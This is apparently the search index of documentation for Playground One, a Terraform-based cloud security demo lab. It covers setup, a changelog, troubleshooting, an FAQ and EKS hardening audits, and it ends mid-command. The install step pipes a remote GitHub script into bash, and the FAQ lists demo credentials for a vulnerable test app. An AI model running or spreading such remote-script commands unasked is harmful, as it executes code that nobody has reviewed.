{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Playground One","text":"<p>Success</p> <p>Hello dear Playground One fan. Nice that you found the documentation.</p> <p>Ultra fast and slim playground in the clouds designed for educational and demoing purposes.</p> <p>Abstract</p> <p>Playground Ones main purpose is to act as a learning platform and demo environment while ensuring a reproducible experience. Playground One itself is containerized and uses Terraform to manage the cloud lifecycle using an easy-to-use command line interface. It integrates with various services such as container clusters, virtual instances, storage, but also with the corresponding Vision One services and endpoints. Among other things, you can gain experience and present Vision One Container Security, File Security, XDR, ASRM, Operations, Server &amp; Workload Protection, and APIs in real environments.</p> <p>Playground One includes scenarios and walkthroughs to help you expand your knowledge of cloud security. So if you've ever wanted to experiment with ECS security, run container image scans with GitHub Actions, use EKS with Fargate, do some nasty things, or drive successful demos, go and play with Playground One.</p> <p>In a nutshell:</p> <ul> <li>Bootstrapping directly from the clouds.</li> </ul> <pre><code>curl -fsSL https://raw.githubusercontent.com/mawinkler/playground-one/main/bin/get_pgoc.sh | bash\n</code></pre> <ul> <li>Playground One is containerized and supports any <code>arm64</code>  or <code>amd64</code> based container engine.</li> <li>Alternatively, you can install natively on your system.</li> <li>Management of the environment with the help of an easy to use command line interface <code>pgo</code>.</li> <li>Based on Terraform &gt;1.6</li> </ul> <p>Under construction!</p> <p>The Playground One is continuously under construction! The capabilities and contents are therefore to be enjoyed with caution and can change at any time.</p>"},{"location":"#major-updates","title":"Major Updates","text":"<p>02/01/2024</p> <ul> <li>Playground One in a Box - The Playground One Container   The Playgrond One Container allows you to use the playground on any container engine hosted either on <code>arm64</code> or <code>amd64</code> from within a containerized environment not affecting your system.</li> </ul> <p>01/23/2024</p> <ul> <li>Playground One starts to support Intel and M1+ MacOS as host platform.</li> </ul> <p>01/16/2024</p> <ul> <li>Playground One starts to support AKS and V1CS on Azure.</li> </ul> <p>12/19/2023</p> <ul> <li>Automated Vision One Container Security deployment with EKS EC2 and Fargate Profiles.</li> </ul> <p>11/14/2023</p> <ul> <li>Deep Security integrated for use in migration scenarios.</li> </ul> <p>10/27/2023</p> <ul> <li>EKS Fargate &amp; EKS Calico on EC2 operational.</li> </ul> <p>10/10/2023</p> <ul> <li>Playground One goes public.</li> </ul> <p>08/07/2023</p> <ul> <li>Initial release.</li> </ul>"},{"location":"#requirements","title":"Requirements","text":"<p>The Playground One is designed to work on these platforms:</p> <p>Playground One Container:</p> <ul> <li>Container engine hosted either on <code>arm64</code> or <code>amd64</code>.</li> <li>Tested with Docker and Colima on Ubuntu, Cloud9, MacOS Intel and Apple Silicon.</li> </ul> <p>Playground One native installation:</p> <ul> <li>Ubuntu Bionic and newer.</li> <li>Intel and M1+ MacOS.</li> </ul>"},{"location":"#system-health","title":"System Health","text":""},{"location":"#aws","title":"AWS","text":"Component Operational Known Issues Vision One Cloud Security Network Yes See 1) Service GatewayIdentity Security EC2 Linux Yes None V1 Server &amp; Workload ProtectionASRM EC2 Windows Yes None V1 Server &amp; Workload Protection EKS EC2 Yes None V1CS Runtime ScanningV1CS Runtime SecurityOAT&amp;WB Generation EKS Fargate Yes None V1CS Runtime ScanningV1CS Runtime SecurityOAT&amp;WB Generation ECS EC2 Yes See 2) V1CS Runtime ScanningV1CS Runtime Security ECS Fargate Yes See 3) V1CS Runtime ScanningV1CS Runtime Security Calico Yes EKS EC2 only Prometheus Yes EKS EC2 only Trivy Yes EKS EC2 only Deep Security Yes None V1 Server &amp; Workload Protection <p>1) In addition to the network itself the following services can be enabled: Active Directory, AWS Managed Active Directory, and Trend Service Gateway. The Active Directories are experimental and to be integrated deeper in the Playground One over time. They will support additional scenarios with Identity Security, Data Security, and more.</p> <p>2) Deleting the cluster requires the deactivation runtime scanning and runtime security before destroying the cluster. If destroy process <code>module.ecs-ec2[0].module.ecs_service.aws_ecs_service.this[0]: Still destroying...</code> hangs for a couple of minutes manually terminate the autoscaling group <code>pgo4-ecs-ec2-asg-spot-...</code> in AWS.</p> <p>3) Activating Runtime Security requires some manual steps, see documentation. Deleting the cluster requires the deactivation of runtime scanning and runtime security before destroying the cluster. Newly created task definitions must be removed manually.</p>"},{"location":"#azure","title":"Azure","text":"Component Operational Known Issues Vision One Cloud Security AKS Yes None V1CS Runtime ScanningV1CS Runtime Security"},{"location":"#other","title":"Other","text":"Component Operational Known Issues Vision One Cloud Security TMAS Yes None Artifact Scanning for Vulnerabilities and Malware TMFS Yes None File and Directory Scanning for Malware Workload Security Yes None V1 Server &amp; Workload Protection Kind Kubernetes In progress Only native"},{"location":"#cli-commands-of-the-playground","title":"CLI Commands of the Playground","text":"<p>Besides the obvious cli tools like <code>kubectl</code>, etc. the Playground offers you additional commands shown in the table below (and more):</p> Command Function pgo The command line interface for Playground One dsm Start or stop a deployed Deep Security tmcli-update Update TMAS and TMFS to the latest version stern Tail logs from multiple pods simultaneously syft See github.com/anchore/syft grype See github.com/anchore/grype k9s See k9scli.io kubie See github.com/sbstp/kubie"},{"location":"#change-log","title":"Change Log","text":"<p>0.3.3</p> <p>New</p> <ul> <li>The network configuration can now optionally create an Active Directory (the PGO-style) within the VPC. Plan is to support Identity Security scenarios in the future. This is cheaper than the AWS Managed Active Directory.</li> </ul> <p>0.3.2</p> <p>New</p> <ul> <li>The network configuration can now optionally create an AWS Managed Active Directory within the VPC. Plan is to support Identity Security scenarios in the future.</li> <li>The same configuration can now optionally deploy a Vision One Service Gateway to the public subnet.</li> <li>There are two new scenarios for the above:</li> <li>Deploy Service Gateway on AWS manually</li> <li>Deploy Service Gateway on AWS automatically</li> <li>New Scenario section: Big Data</li> <li>Setup Elastic (ELK Stack)</li> </ul> <p>Fixes</p> <ul> <li>The deployment of Vision Container Security did use an incorrect API call when creating the cluster. Instead of <code>resourceId</code> the key <code>arn</code> from the old beta API was used.</li> </ul> <p>0.3.1</p> <p>New</p> <ul> <li>Cloud One Conformity Exception Workflows inspired by customer</li> <li>New Scenario section: Big Data<ul> <li>Setup Splunk</li> <li>Integrate Vision One with Splunk</li> <li>Integrate V1CS Customer Runtime Security Rules with Splunk</li> </ul> </li> </ul> <p>Changes</p> <ul> <li>Kind cluster now supports Workbench and OAT generation</li> </ul> <p>0.3.0</p> <p>Changes</p> <ul> <li>Migrated V1CS api to v3.0.</li> </ul> <p>0.2.9</p> <p>Changes</p> <ul> <li>Bump EKS module to version 20.8.5</li> <li>Reworked IAM for EKS-EC2 to not use am AWS admin account. Proper access permissions implemented. Minor IAM changes in EKS-FG.</li> </ul> <p>0.2.8 (04/19/2024)</p> <p>Fixes</p> <ul> <li>Resize file system now detects root volume device name.</li> </ul> <p>0.2.7 (04/04/2024)</p> <p>Fixes</p> <ul> <li>Fix in pgo cli to support Vision One Regions.</li> <li>Azure App Gateway functional with Java-Goof app of scenarios.</li> </ul> <p>0.2.6 (04/03/2024)</p> <p>Fixes</p> <ul> <li>Various fixes and compatibility changes for Product Experience and Deep Security Migration Scenario.</li> <li>Playground One now supports all Vision One Regions when interacting with the REST API.</li> <li>App Gateway now functional on AKS cluster. Ingress for Scenarios to be done.</li> </ul> <p>Changes</p> <ul> <li>Bump version of DSM to 20.0.893</li> </ul> <p>0.2.5 (03/21/2024)</p> <p>Playground One is now included in Trend Micro Product Experience.</p> <p>Changes</p> <ul> <li>Enabled EC2 Instance Connect via Console to EC2 instances for some regions. See FAQ.</li> <li>Playground One is now able to run on Trend Micro Platform Experience. Ensure to enable it in the configuration.</li> <li>Deep Security now has SOAP API enabled.</li> <li>Upgraded Deep Security Manager and Agents to versions as of 03/18/2023.</li> <li>Added dryrun capability for apply and destroy in CLI.</li> </ul> <p>0.2.4 (03/13/2024)</p> <p>Changes</p> <ul> <li>The preparation for potential attack path detections with ASRM can now be enabled or disabled via the config tool.</li> <li>IAM User Potential Attack Path with a new scenario.</li> </ul> <p>0.2.3 Fix release (03/08/2024)</p> <p>Fixes</p> <ul> <li>Corrected lock handling on network.</li> </ul> <p>0.2.2 (03/07/2024)</p> <p>Fixes</p> <ul> <li><code>ecsfg-add-v1cs</code> does now work within the Playground One Container.</li> </ul> <p>Changes</p> <ul> <li>AWS and Azure now use the same environment name.</li> <li>Local Kind cluster now supports load balancing and ingress controller based on Contour-Envoy.</li> </ul> <p>0.2.1 Fix release (02/27/2024)</p> <p>Fixes</p> <ul> <li>The implementation of a proper Vision One Container Security life-cycle broke the deployment since the DELETE api_call was fired too early.</li> </ul> <p>Changes</p> <ul> <li>Simple S3 Bucket scanner now part of Playground One. This includes a dedicated scenario.</li> <li>Improved handling of public IPs in configflow when running on Cloud9.</li> <li>Eventually existing Azure credentials are now made available within the container.</li> </ul> <p>0.2 Maintenance release (02/20/2024)</p> <p>Fixes</p> <ul> <li>Vision One Container Security gets unregistered from Vision One on cluster destroy.</li> <li>Cluster deployments are now correctly destroyed in the correct order.</li> <li>Allow docker client to work with docker.sock on Cloud9</li> </ul> <p>Changes</p> <ul> <li>Playground One Container now supports versioning.</li> <li>ECS Fargate task definition patcher bumped to version 2.3.30</li> <li>New scenario added: Container Image Vulnerability and Malware Scanning as GitHub Action.</li> <li>Removed openssl3 demo app.</li> </ul> <p>0.1 Initial release (02/06/2024)</p>"},{"location":"#support","title":"Support","text":"<p>This is an Open Source community project. Project contributors may be able to help, depending on their time and availability. Please be specific about what you're trying to do, your system, and steps to reproduce the problem.</p> <p>For bug reports or feature requests, please open an issue. You are welcome to contribute.</p> <p>Official support from Trend Micro is not available. Individual contributors may be Trend Micro employees, but are not official support.</p>"},{"location":"#contribute","title":"Contribute","text":"<p>I do accept contributions from the community. To submit changes:</p> <ol> <li>Fork this repository.</li> <li>Create a new feature branch.</li> <li>Make your changes.</li> <li>Submit a pull request with an explanation of your changes or additions.</li> </ol> <p>I will review and work with you to release the code.</p>"},{"location":"bloopers/","title":"Bloopers during development","text":""},{"location":"bloopers/#terraform","title":"Terraform","text":""},{"location":"bloopers/#delete-all-resources-except-one","title":"Delete all resources except one","text":"<p>There is no --except feature in terraform destroy command currently. If you really want to do that, and you know what you are doing, here is the workaround.</p> <pre><code># list all resources\nterraform state list\n\n# remove that resource you don't want to destroy\n# you can add more to be excluded if required\nterraform state rm &lt;resource_to_be_deleted&gt; \n\n# destroy the whole stack except above excluded resource(s)\nterraform destroy \n</code></pre> <p>So why do these commands work for your idea?</p> <p>The state (*.tfstate) is used by Terraform to map real world resources to your configuration, keep track of metadata.</p> <p>terraform state rm cleans a record (resource) from the state file (*.tfstate) only. It doesn't destroy the real resource.</p> <p>Since you don't run terraform apply or terraform refresh, after terraform state rm, terraform doesn't know the excluded resource was created at all.</p> <p>When you run terraform destroy, it has no detail about that excluded resource\u2019s state and will not destroy it. It will destroy the rest.</p> <p>By the way, later you still have chance to import the resource back with terraform import command if you want.</p> <pre><code>terraform import module.vpc.aws_vpc.vpc vpc-0933149e01f1136aa\n</code></pre>"},{"location":"bloopers/#ecs-cluster-with-capacity-providers-cannot-be-destroyed","title":"ECS cluster with capacity providers cannot be destroyed","text":"<p>The problem is that the capacity_provider property on the aws_ecs_cluster introduces a new dependency: aws_ecs_cluster depends on aws_ecs_capacity_provider depends on aws_autoscaling_group.</p> <p>This causes terraform to destroy the ECS cluster before the autoscaling group, which is the wrong way around: the autoscaling group must be destroyed first because the cluster must contain zero instances before it can be destroyed.</p> <p>This leads to Terraform error out with the cluster partly alive and the capacity providers fully alive.</p> <p>References:</p> <ul> <li>https://github.com/hashicorp/terraform-provider-aws/issues/4852</li> <li>https://github.com/hashicorp/terraform-provider-aws/issues/11409</li> <li>https://github.com/hashicorp/terraform-provider-aws/pull/22672</li> </ul> <p>I haven't found a proper workaround, yet...</p>"},{"location":"bloopers/#eks","title":"EKS","text":""},{"location":"bloopers/#unable-to-delete-ingress","title":"Unable to delete ingress","text":"<pre><code>kubectl delete ValidatingWebhookConfiguration aws-load-balancer-webhook\nkubectl patch ingress $ingressname -n $namespace -p '{\"metadata\":{\"finalizers\":[]}}' --type=merge\n</code></pre>"},{"location":"bloopers/#unable-to-delete-namespace","title":"Unable to delete namespace","text":"<p>To delete a namespace, Kubernetes must first delete all the resources in the namespace. Then, it must check registered API services for the status. A namespace gets stuck in Terminating status for the following reasons:</p> <ul> <li>The namespace contains resources that Kubernetes can't delete.</li> <li>An API service has a False status.</li> </ul> <p>Scripted:</p> <pre><code>knsrm-finalizer &lt;NAMESPACE&gt;\n</code></pre> <p>Manual:</p> <ol> <li>Save a JSON file like in the following example:</li> </ol> <pre><code>namespace=&lt;NAMESPACE&gt;\n\nkubectl get namespace $namespace -o json &gt; tempfile.json\n</code></pre> <ol> <li>Remove the finalizers array block from the spec section of the JSON file:</li> </ol> <pre><code>\"spec\": {\n        \"finalizers\": [\n            \"kubernetes\"\n        ]\n    }\n</code></pre> <p>After you remove the finalizers array block, the spec section of the JSON file looks like this:</p> <pre><code>\"spec\" : {\n    }\n</code></pre> <ol> <li>To apply the changes, run the following command:</li> </ol> <pre><code>kubectl replace --raw \"/api/v1/namespaces/$namespace/finalize\" -f ./tempfile.json\n</code></pre> <ol> <li>Verify that the terminating namespace is removed:</li> </ol> <pre><code>kubectl get namespaces\n</code></pre> <p>Repeat these steps for any remaining namespaces that are stuck in the Terminating status.</p>"},{"location":"bloopers/#eksworkernode-is-not-joining-node-group","title":"EKSWorkerNode is not joining Node Group","text":"<p>This does help to identify the problem:</p> <ul> <li>https://repost.aws/knowledge-center/resolve-eks-node-failures</li> <li>https://docs.aws.amazon.com/systems-manager-automation-runbooks/latest/userguide/automation-awssupport-troubleshooteksworkernode.html</li> <li>https://console.aws.amazon.com/systems-manager/automation/execute/AWSSupport-TroubleshootEKSWorkerNode</li> </ul>"},{"location":"bloopers/#eks-service-behind-alb-shows-only-html","title":"EKS Service behind ALB shows only HTML","text":"<pre><code>resource \"kubernetes_ingress_v1\" \"openssl3_ingress\" {\n  wait_for_load_balancer = true\n\n  metadata {\n    annotations = {\n      \"alb.ingress.kubernetes.io/scheme\"        = \"internet-facing\"\n      \"alb.ingress.kubernetes.io/target-type\"   = \"ip\"\n      \"kubernetes.io/ingress.class\"             = \"alb\"\n      \"alb.ingress.kubernetes.io/inbound-cidrs\" = var.access_ip\n    }\n    labels = {\n      app = \"web-app\"\n    }\n    name      = \"web-app-ingress\"\n    namespace = var.namespace\n  }\n  spec {\n    rule {\n      http {\n        path {\n          backend {\n            service {\n              name = \"web-app-service\"\n              port {\n                number = 80\n              }\n            }\n          }\n          path = \"/*\"\n        }\n      }\n    }\n  }\n}\n</code></pre> <p>The <code>*</code> in <code>path</code> is important :-)</p>"},{"location":"bloopers/#route53","title":"Route53","text":"<p>If a hosted zone is destroyed and re-provisioned, new name server records are associated with the new hosted zone. However, the domain name might still have the previous name server records associated with it.</p> <p>If AWS Route 53 is used as the domain name registrar, head to Route 53 &gt; Registered domains &gt; ${your-domain-name} &gt; Add or edit name servers and add the newly associated name server records from the hosted zone to the registered domain.</p>"},{"location":"bloopers/#xdr-for-containers","title":"XDR for Containers","text":"<p>Initially, I thought I just need to leave the VPC alone when changing/destroying part of the network configuration. This was a failure...</p>"},{"location":"bloopers/#misc-commands-which-helped-at-some-point","title":"Misc commands which helped at some point","text":"<pre><code>aws kms delete-alias --alias-name alias/eks/playground-one-eks\n</code></pre>"},{"location":"bloopers/#eks-ec2-autoscaler","title":"EKS EC2 Autoscaler","text":"<p>In some cases creating the EKS cluster with EC2 instances failes just before finishing with the following error:</p> <pre><code>\u2577\n\u2502 Warning: Helm release \"cluster-autoscaler\" was created but has a failed status. Use the `helm` command to investigate the error, correct it, then run Terraform again.\n\u2502 \n\u2502   with module.eks.helm_release.cluster_autoscaler[0],\n\u2502   on eks-ec2/autoscaler.tf line 25, in resource \"helm_release\" \"cluster_autoscaler\":\n\u2502   25: resource \"helm_release\" \"cluster_autoscaler\" {\n\u2502 \n\u2575\n...\n\u2577\n\u2502 Error: 1 error occurred:\n\u2502       * Internal error occurred: failed calling webhook \"mservice.elbv2.k8s.aws\": failed to call webhook: Post \"https://aws-load-balancer-webhook-service.kube-system.svc:443/mutate-v1-service?timeout=10s\": no endpoints available for service \"aws-load-balancer-webhook-service\"\n\u2502 \n\u2502 \n\u2502 \n\u2502   with module.eks.helm_release.cluster_autoscaler[0],\n\u2502   on eks-ec2/autoscaler.tf line 25, in resource \"helm_release\" \"cluster_autoscaler\":\n\u2502   25: resource \"helm_release\" \"cluster_autoscaler\" {\n\u2502 \n\u2575\n</code></pre> <p>This looks like a timing issue for me which I need to investigate further. If you run into this problem just rerun</p> <pre><code>pgo --apply eks-ec2\n</code></pre> <p>This should complete the cluster creation within seconds then.</p>"},{"location":"faq/","title":"Frequently asked Questions","text":""},{"location":"faq/#how-to-update-the-playgound-one","title":"How to update the Playgound One?","text":"<p>The Playground is under contiuous development. Even if I try to not implement breaking changes please follow the steps below before updating it to the latest version:</p> <pre><code># Destroy your deployments\npgo --destroy all\n\n# Destroy your network\npgo --destroy nw\n\n# Do the update\ncd ${ONEPATH}\ngit pull\n\n# Run config\npgo --config\n</code></pre> <p>If everything went well you should be able to recreate your environment. If you run into trouble please open an issue.</p>"},{"location":"faq/#im-running-the-playground-on-a-cloud9-and-want-to-restrict-access-to-my-home-ip","title":"I'm running the Playground on a Cloud9 and want to restrict access to my home IP","text":"<p>If you work on a Cloud9 you need to take care on two public IP addresses instead of one when having the playground locally. These are the public IP of your own network (where your own computer is located) and the public IP of your Cloud9.</p> <p>Your own IP is required since you likely want to access the applications provided by the Playground One running on EKS, ECS and connect to the EC2 instances.</p> <p>The public IP of the Cloud9 is required to allow your Cloud9 access the EC2 instances while provisioning.</p> <p>For this to work you need to define two <code>Access IPs/CIDRs</code> in the configuration workflow with <code>pgo --configure</code>.</p> <p>Example:</p> <p>Public IP address of your</p> <ul> <li>Cloud 9 instance: <code>3.123.18.11</code> (get it from the EC2 console), and</li> <li>Client at home: <code>87.170.6.193</code></li> </ul> <pre><code> __                 __   __   __             __      __        ___ \n|__) |     /\\  \\ / / _` |__) /  \\ |  | |\\ | |  \\    /  \\ |\\ | |__  \n|    |___ /~~\\  |  \\__&gt; |  \\ \\__/ \\__/ | \\| |__/    \\__/ | \\| |___ \n\n...\nPlease set/update your Playground One configuration\nAccess IPs/CIDRs []: 3.123.18.11, 87.170.6.193\n...\n</code></pre> <p>The above will automatically be converted into the correct CIDRs <code>3.123.18.11/32, 87.170.6.193/32</code></p> <p>To simplify this process you can easily let the config tool determine the Cloud9 public IP address by entering the keyword <code>pub</code>.</p> <pre><code>...\nPlease set/update your Playground One configuration\nAccess IPs/CIDRs []: pub, 87.170.6.193\n...\n</code></pre> <p>Then run</p> <pre><code>pgo --init nw\npgo --apply nw\n</code></pre>"},{"location":"faq/#my-ip-address-has-changed-and-i-cannot-access-my-environment-anymore","title":"My IP address has changed and I cannot access my environment anymore","text":"<p>If you need to change the access IP later on, maybe your provider assigned you a new one, follow these steps:</p> <ol> <li>Run <code>pgo --updateip</code> and set the new IP address as described in Getting Started Configuration</li> <li> <p>Terraform tells you which actions will be performed when approving them. Validate that there will be only one in-place update on the resource <code>module.ec2.aws_security_group.sg[\"public\"]</code>.</p> <pre><code>Terraform used the selected providers to generate the following execution plan. Resource actions are indicated with the following symbols:\n  ~ update in-place\n\nTerraform will perform the following actions:\n\n  # module.ec2.aws_security_group.sg[\"public\"] will be updated in-place\n  ~ resource \"aws_security_group\" \"sg\" {\n        id                     = \"sg-01e76a72ffd468baa\"\n      ~ ingress                = [\n...\n</code></pre> </li> <li> <p>Approve the actions by entering <code>yes</code>, otherwise press <code>^c</code>.</p> </li> </ol> <p>This should be completed within a minute.</p> <p>If the above didn't work for you and you still need to update the IP(s) you need to run</p> <pre><code>pgo --destroy all\npgo --init all\npgo --apply nw\n</code></pre> <p>Then reapply your eks, ecs, ec2 or scenarios by <code>pgo --apply &lt;configuration&gt;</code>.</p>"},{"location":"faq/#i-restarted-my-cloud9-instance-and-i-cannot-access-my-environment-anymore","title":"I restarted my Cloud9 instance and I cannot access my environment anymore","text":"<p>See above.</p>"},{"location":"faq/#i-cannot-destroy-the-ecs-clusters","title":"I cannot destroy the ECS cluster(s)","text":"<p>If you have enabled <code>Runtime Scanning</code> and/or <code>Runtime Security</code> in your Vision One console for your ECS clusters disable them and press <code>[Save]</code>. Wait for the container security services/tasks disappear on the EC2 console. The clusters should then be successfully destroyed.</p> <p>Background: Vision One injects addisional tasks to the ECS clusters which are not known by the playground. Even if you delete the task in the AWS console they are injected again by Vision One. This causes a remaining dependency on the AWS side which prevents the destruction of ECS.</p> <p>Special case for ECS EC2</p> <p>There's a known bug in Terraform. The problem is that this new capacity_provider property on the aws_ecs_cluster introduces a new dependency: aws_ecs_cluster depends on aws_ecs_capacity_provider depends on aws_autoscaling_group.</p> <p>This causes terraform to destroy the ECS cluster before the autoscaling group, which is the wrong way around: the autoscaling group must be destroyed first because the cluster must contain zero instances before it can be destroyed.</p> <p>This leads to Terraform error out with the cluster partly alive and the capacity providers fully alive.</p> <p>The <code>pgo</code> CLI solves this problem by running <code>aws</code> CLI commands to delete the capacity providers before doing <code>terraform destroy</code>. Not nice but works.</p>"},{"location":"faq/#i-dont-find-the-todolist-app-of-java-goof","title":"I don't find the <code>todolist</code>-app of Java-Goof","text":"<p>To access the <code>todolist</code> application append <code>/todolist</code> to the loadbalancer DNS name in your browser.</p> <p>For authentication use:</p> <ul> <li>Username: <code>foo@bar.org</code></li> <li>Password: <code>foobar</code></li> </ul>"},{"location":"faq/#upgrade-vision-one-container-security-to-the-latest-release","title":"Upgrade Vision One Container Security to the latest Release","text":"<pre><code>helm get values --namespace trendmicro-system container-security | helm upgrade container-security \\\n    --namespace trendmicro-system \\\n    --values - \\\n    https://github.com/trendmicro/cloudone-container-security-helm/archive/master.tar.gz\n</code></pre>"},{"location":"faq/#aws-ec2-instance-connect-does-not-work-from-the-aws-ec2-console","title":"AWS EC2 Instance Connect does not work from the AWS EC2 Console","text":"<p>EC2 Instance Connect uses specific IP address ranges for browser-based SSH connections to your instance (when users use the Amazon EC2 console to connect to an instance). These IP address ranges are documented here.</p> <p>To filter this large list for instance connect run:</p> <pre><code>jq '.prefixes[] | select(.service==\"EC2_INSTANCE_CONNECT\") | .' ip-ranges.json\n</code></pre> <p>Currently, Playground One does only allow Instance Connect from the following regions:</p> Region IP address range eu-central-1 3.120.181.40/29 eu-west-1 18.202.216.48/29 eu-west-2 3.8.37.24/29 eu-west-3 35.180.112.80/29 eu-north-1 13.48.4.200/30 us-east-1 18.206.107.24/29 us-east-2 3.16.146.0/29 us-west-1 13.52.6.112/29 us-west-2 18.237.140.160/29 <p>If you need any other reagion, please let me know.</p> <p>See:</p> <ul> <li>AWS Documentation</li> <li>AWS IP Ranges</li> </ul>"},{"location":"faq/#know-how-to-check-the-region-and-data-center-location-details-in-trend-vision-one","title":"Know how to check the region and Data Center location details in Trend Vision One","text":"<p>To find out API URLs and datacenter locations, check the Vision One Site URL you are using:</p> Site Vision One Site US https://portal.xdr.trendmicro.com/ EU https://portal.eu.xdr.trendmicro.com/ JP https://portal.jp.xdr.trendmicro.com/ SG https://portal.sg.xdr.trendmicro.com/ AU https://portal.au.xdr.trendmicro.com/ IN https://portal.in.xdr.trendmicro.com/ <p>This takes you to the Region Code and API URL:</p> Site Region Code API URL US us-east-1 https://api.xdr.trendmicro.com EU eu-central-1 https://api.eu.xdr.trendmicro.com JP ap-northeast-1 https://api.xdr.trendmicro.co.jp SG ap-southeast-1 https://api.sg.xdr.trendmicro.com AU ap-southeast-2 https://api.au.xdr.trendmicro.com IN ap-south-1 https://api.in.xdr.trendmicro.com <p>The Data Centers for the locations are then listed below:</p> Site Data Center Name Data Center Location Azure Data Center Location AWS US United States East US - N. Virginia East US - N. Virginia EU Germany West Europe - Netherlands Frankfurt, Germany JP Japan Tokyo, Japan Tokyo, Japan SG Singapore Singapore Singapore AU Australia Australia Central Sidney, Australia IN India Mumbai Mumbai <p>Link: Trend Micro Business Success Portal</p>"},{"location":"security/","title":"Playground One Security","text":""},{"location":"security/#network","title":"Network","text":""},{"location":"security/#eks","title":"EKS","text":""},{"location":"security/#54-cluster-networking","title":"5.4. Cluster Networking","text":"<p>Restrict Access to the Control Plane Endpoint</p> <p>Authorized networks are a way of specifying a restricted range of IP addresses that are permitted to access your cluster's control plane. Kubernetes Engine uses both Transport Layer Security (TLS) and authentication to provide secure access to your cluster's control plane from the public internet. This provides you the flexibility to administer your cluster from anywhere; however, you might want to further restrict access to a set of IP addresses that you control. You can set this restriction by specifying an authorized network.</p> <p>Restricting access to an authorized network can provide additional security benefits for your container cluster, including:</p> <ul> <li>Better protection from outsider attacks: Authorized networks provide an additional layer of security by limiting external access to a specific set of addresses you designate, such as those that originate from your premises. This helps protect access to your cluster in the case of a vulnerability in the cluster's authentication or authorization mechanism.</li> <li>Better protection from insider attacks: Authorized networks help protect your cluster from accidental leaks of master certificates from your company's premises. Leaked certificates used from outside Cloud Services and outside the authorized IP ranges (for example, from addresses outside your company) are still denied access.</li> </ul> <p>By enabling private endpoint access to the Kubernetes API server, all communication between your nodes and the API server stays within your VPC. You can also limit the IP addresses that can access your API server from the internet, or completely disable internet access to the API server.</p> <p>With this in mind, you can update your cluster accordingly using the AWS CLI to ensure that Private Endpoint Access is enabled.</p> <p>If you choose to also enable Public Endpoint Access then you should also configure a list of allowable CIDR blocks, resulting in restricted access from the internet. If you specify no CIDR blocks, then the public API server endpoint is able to receive and process requests from all IP addresses by defaulting to ['0.0.0.0/0'].</p> <p>For example, the following command would enable private access to the Kubernetes API as well as limited public access over the internet from a single IP address (noting the /32 CIDR suffix):</p> <pre><code>aws eks update-cluster-config --region ${aws_region} --name ${cluster_name} --resources-vpc-config endpointPrivateAccess=true, endpointPrivateAccess=true,publicAccessCidrs=\"203.0.113.5/32\"\n</code></pre> <p>Audit - Playground One:</p> <pre><code>cd ${ONEPATH}/awsone/4-cluster-eks-ec2\ncluster_name=$(terraform output -raw cluster_name)\n\necho Cluster private access enpoint enabled:\naws eks describe-cluster --name ${cluster_name} --query \"cluster.resourcesVpcConfig.endpointPrivateAccess\"\n\necho Cluster public access enpoint enabled:\naws eks describe-cluster --name ${cluster_name} --query \"cluster.resourcesVpcConfig.endpointPublicAccess\"\n\necho Cluster public access CIDRs:\naws eks describe-cluster --name ${cluster_name} --query \"cluster.resourcesVpcConfig.publicAccessCidrs\"\n</code></pre> <pre><code># Example\nCluster private access enpoint enabled:\ntrue\nCluster public access enpoint enabled:\ntrue\nCluster public access CIDRs:\n[\n    \"84.190.104.66/32\"\n]\n</code></pre> <p>References: https://docs.aws.amazon.com/eks/latest/userguide/cluster-endpoint.html</p> <p>CIS Controls:</p> <ul> <li>4.4 Implement and Manage a Firewall on Servers Implement and manage a firewall on servers, where supported. Example implementations include a virtual firewall, operating system firewall, or a third-party firewall agent.</li> <li>9.3 Maintain and Enforce Network-Based URL Filters Enforce and update network-based URL filters to limit an enterprise asset from connecting to potentially malicious or unapproved websites. Example implementations include category-based filtering, reputation-based filtering, or through the use of block lists. Enforce filters for all enterprise assets.</li> <li>7.4 Maintain and Enforce Network-Based URL Filters Enforce network-based URL filters that limit a system's ability to connect to websites not approved by the organization. This filtering shall be enforced for each of the organization's systems, whether they are physically at an organization's facilities or not.</li> </ul> <p>Ensure clusters are created with Private Endpoint Enabled and Public Access Disabled</p> <p>In a private cluster, the master node has two endpoints, a private and public endpoint. The private endpoint is the internal IP address of the master, behind an internal load balancer in the master's VPC network. Nodes communicate with the master using the private endpoint. The public endpoint enables the Kubernetes API to be accessed from outside the master's VPC network.</p> <p>Although Kubernetes API requires an authorized token to perform sensitive actions, a vulnerability could potentially expose the Kubernetes publically with unrestricted access. Additionally, an attacker may be able to identify the current cluster and Kubernetes API version and determine whether it is vulnerable to an attack. Unless required, disabling public endpoint will help prevent such threats, and require the attacker to be on the master's VPC network to perform any attack on the Kubernetes API. Impact:</p> <p>Configure the EKS cluster endpoint to be private.</p> <ol> <li>LeavetheclusterendpointpublicandspecifywhichCIDRblockscan communicate with the cluster endpoint. The blocks are effectively a whitelisted set of public IP addresses that are allowed to access the cluster endpoint.</li> <li>ConfigurepublicaccesswithasetofwhitelistedCIDRblocksandsetprivate endpoint access to enabled. This will allow public access from a specific range of public IPs while forcing all network traffic between the kubelets (workers) and the Kubernetes API through the cross-account ENIs that get provisioned into the cluster VPC when the control plane is provisioned.</li> </ol> <p>Audit - Playground One (see above)</p> <p>References: https://docs.aws.amazon.com/eks/latest/userguide/cluster-endpoint.html</p> <p>CIS Controls:</p> <ul> <li>4.4 Implement and Manage a Firewall on Servers Implement and manage a firewall on servers, where supported. Example implementations include a virtual firewall, operating system firewall, or a third-party firewall agent.</li> <li>12 Boundary Defense</li> </ul> <p>Ensure clusters are created with Private Nodes</p> <p>Disabling public IP addresses on cluster nodes restricts access to only internal networks, forcing attackers to obtain local network access before attempting to compromise the underlying Kubernetes hosts.</p> <p>To enable Private Nodes, the cluster has to also be configured with a private master IP range and IP Aliasing enabled.</p> <p>Private Nodes do not have outbound access to the public internet. If you want to provide outbound Internet access for your private nodes, you can use Cloud NAT or you can manage your own NAT gateway.</p> <p>Audit - Playground One (see above)</p> <p>References: https://docs.aws.amazon.com/eks/latest/userguide/cluster-endpoint.html</p> <p>CIS Controls:</p> <ul> <li>4.4 Implement and Manage a Firewall on Servers Implement and manage a firewall on servers, where supported. Example implementations include a virtual firewall, operating system firewall, or a third-party firewall agent.</li> <li>12 Boundary Defense</li> </ul> <p>Ensure Network Policy is Enabled and set as appropriate</p> <pre><code>cd ${ONEPATH}/awsone/4-cluster-eks-ec2\ncluster_name=$(terraform output -raw cluster_name)\n\necho Cluster security group id:\naws eks describe-cluster --name ${cluster_name} --query 